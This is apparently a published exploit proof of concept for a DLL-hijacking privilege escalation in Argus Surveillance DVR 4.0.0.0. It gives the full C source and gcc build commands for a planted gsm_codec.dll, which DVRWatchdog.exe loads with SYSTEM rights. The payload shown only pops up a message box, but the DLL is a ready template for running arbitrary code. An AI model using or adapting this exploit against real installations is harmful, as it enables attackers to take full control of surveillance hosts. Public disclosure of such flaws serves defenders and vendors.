/*
# Exploit Title: Argus Surveillance DVR 4.0.0.0 - Privilege Escalation
# Author: John Page (aka hyp3rlinx)
# Date: 2018-08-29
# Vendor: Argus Surveillance DVR - 4.0.0.0
# Software Link: http://www.argussurveillance.com/download/DVR_stp.exe
# CVE: N/A
# Tested on: Windows 7 x86

# Description:
# Argus Surveillance DVR 4.0.0.0 devices allow Trojan File SYSTEM Privilege Escalation.
# Placing a Trojan File DLL named "gsm_codec.dll" in Argus application directory will
# lead to arbitrary code execution with SYSTEM integrity
# Affected Component: DVRWatchdog.exe

# Exploit/POC
# Create DLL 32bit DLL named "gsm_codec.dll" and place in App Dir,
# launch Argus DVR tada! your now SYSTEM.
*/

#include <windows.h>

/* hyp3rlinx */

/*
gcc -c -m32 gsm_codec.c
gcc -shared -m32 -o gsm_codec.dll gsm_codec.o
*/

void systemo(){
	 MessageBox( 0, "3c184981367094fce3ab70efc3b44583" , "philbin :)" , MB_YESNO + MB_ICONQUESTION );
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved){
	switch(fdwReason){
		case DLL_PROCESS_ATTACH:{
			 systemo();
			break;
		}
		case DLL_PROCESS_DETACH:{
			 systemo();
			break;
		}
		case DLL_THREAD_ATTACH:{
			 systemo();
			break;
		}
		case DLL_THREAD_DETACH:{
			 systemo();
			break;
		}
	}

	return TRUE;
}

# https://vimeo.com/287115698
# Greetz: ***Greetz: indoushka | Eduardo | GGA***